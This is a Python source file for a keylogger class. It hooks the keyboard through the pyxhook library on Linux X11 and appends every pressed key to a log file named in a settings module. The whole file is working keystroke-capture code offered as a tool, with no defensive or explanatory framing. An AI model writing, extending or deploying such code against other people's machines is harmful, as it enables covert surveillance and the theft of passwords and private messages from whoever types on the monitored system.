import os
import time

import pyxhook # install python-xlib

import settings

class Keylogger:

    def __init__(self):
        pass

    def start(self):
        log_file = settings.log_file
        cancel_key = settings.cancel_key

        if settings.log_clean is not None:
            try:
                os.remove(log_file)
            except EnvironmentError:
               # File does not exist, or no permissions.
                pass

        def OnKeyPress(event):
            with open(log_file, 'a') as f:
                f.write('{}\n'.format(event.Key.lower()))

        new_hook = pyxhook.HookManager()
        new_hook.KeyDown = OnKeyPress
        new_hook.HookKeyboard()

        try:
            new_hook.start()
        except KeyboardInterrupt:
            pass
        except Exception as ex:
            msg = 'Error while catching events:\n  {}'.format(ex)
            pyxhook.print_err(msg)
            with open(log_file, 'a') as f:
                f.write('\n{}'.format(msg))

        running = True
        while running:
            time.sleep(0.1)
